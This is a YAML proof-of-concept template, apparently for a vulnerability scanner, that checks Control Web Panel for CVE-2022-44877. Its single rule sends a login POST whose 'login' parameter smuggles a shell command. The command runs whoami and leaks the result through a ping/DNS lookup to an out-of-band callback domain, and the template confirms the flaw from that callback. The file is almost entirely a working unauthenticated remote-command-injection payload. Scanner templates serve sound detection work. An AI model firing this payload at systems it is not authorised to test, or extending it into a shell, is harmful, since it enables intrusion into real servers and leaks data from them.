name: poc-yaml-ControlWebPanel-cve-2022-44877
binding: 2b487a0b-5c19-4315-a1fa-0a69885af13b
manual: true
detail:
    author: ar3h
    links:
        - https://github.com/numanturle/CVE-2022-44877
    vulnerability:
        level: critical
transport: http
set:
    reverse: newReverse()
    reverseDomain: reverse.domain
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /login/index.php?login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{reverseDomain}})
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: username=root&password=toor&commit=Login
            follow_redirects: false
        expression: response.status == 302 && reverse.wait(5)
expression: r0()
